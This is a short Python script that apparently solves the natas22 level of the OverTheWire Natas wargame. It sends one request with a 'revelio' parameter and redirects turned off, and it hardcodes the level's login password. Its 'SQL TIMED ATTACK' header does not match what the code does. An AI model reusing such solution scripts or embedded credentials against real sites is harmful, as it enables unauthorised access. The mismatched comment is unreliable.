#!/usr/bin/env python
# SQL TIMED ATTACK
import requests
import re
from string import *
from time import *

characters = lowercase + uppercase + digits	
	
username='natas22'
password='chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'

url = 'http://%s.natas.labs.overthewire.org/' %username

path = '?revelio=true'
session = requests.session()


response = session.post(url + path, auth=(username, password), allow_redirects=False)

content = response.text
print response.headers
print response.history
print content

#This one was pretty simple as the only task was to send 'revelio' in GET request.
# The main part was to turn off the redirects as it'd lead to the home directory again and again